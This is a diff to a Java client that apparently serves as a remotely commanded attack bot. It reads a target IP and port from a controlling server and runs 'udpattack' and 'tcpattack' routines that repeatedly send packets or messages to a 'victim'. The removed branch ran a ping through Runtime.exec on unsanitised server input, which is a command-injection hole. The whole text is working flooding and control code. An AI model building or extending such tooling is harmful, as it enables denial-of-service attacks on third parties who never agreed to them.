@@ -5,6 +5,8 @@ import java.io.PrintWriter;
 import java.net.InetAddress;
 import java.net.Socket;
 import java.util.concurrent.TimeUnit;
+import java.net.DatagramPacket;
+import java.net.DatagramSocket;
 /*
 This class defines the client
  */
@@ -92,21 +94,22 @@ public static void main(String args[]) throws Exception {
         os.println("portip ~ DONE!");
         os.flush();
       }
-      else if(response.equals("icmpattack"))//option to initiate ICMP attack by pinging given IP address
+      else if(response.equals("udpattack"))//option to initiate UDP attack by pinging given IP address
       {
-        System.out.println("Initiating ICMP attack...");
-      //  telnet <ip_address> <port_number>
+        System.out.println("Initiating UDP attack...");
         String ipA=is.readLine();
-        Runtime rt = Runtime.getRuntime();
-        Process proc = rt.exec("ping "+ipA);
-        BufferedReader stdInput = new BufferedReader(new InputStreamReader(proc.getInputStream()));
-        System.out.println("Here is the output of the command:\n");
-        String s = null;
-        while ((s = stdInput.readLine()) != null)
+        int portn=Integer.parseInt(is.readLine());
+        InetAddress ip = InetAddress.getByName(ipA);
+        DatagramSocket ds = new DatagramSocket();
+        byte buf[] = "UDP Attack!".getBytes();
+        DatagramPacket DpSend =  new DatagramPacket(buf, buf.length, ip, portn);
+        for(int qk=0;qk<60;qk++)//sends 60 messages in a duration of 60 seconds
         {
-          System.out.println(s);
+
+           ds.send(DpSend);
+          Thread.sleep(1000);
         }
-        os.println("icmpattack ~ DONE!");
+        os.println("udpattack ~ DONE!");
         os.flush();
       }
       else if(response.equals("tcpattack"))//option to initiate TCP attack by making a socket with given IP address and port and opening an output stream to it, and flooding it with messages
@@ -117,11 +120,11 @@ public static void main(String args[]) throws Exception {
           Socket sock=new Socket(ipA, portn); //establishes connection
           PrintWriter inpst=new PrintWriter(sock.getOutputStream());//gets inputstream to flood with messages
           System.out.println("TCP connection with victim established...");
-          for(int qk=0;qk<20;qk++)//sends 20 messages in a duration of 5 seconds
+          for(int qk=0;qk<60;qk++)//sends 60 messages in a duration of 60 seconds
           {
             inpst.println("attacking...");
             inpst.flush();
-            Thread.sleep(250);
+            Thread.sleep(1000);
           }
 
         }
